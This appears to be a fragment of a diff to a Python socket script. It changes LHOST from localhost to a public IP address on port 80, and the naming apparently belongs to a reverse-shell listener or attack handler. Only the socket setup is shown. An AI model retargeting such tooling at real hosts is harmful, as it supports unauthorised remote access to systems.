@@ -1,6 +1,6 @@
 import socket
 import threading
-LHOST = '127.0.0.1'
+LHOST = '83.160.125.93'
 LPORT = 80
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
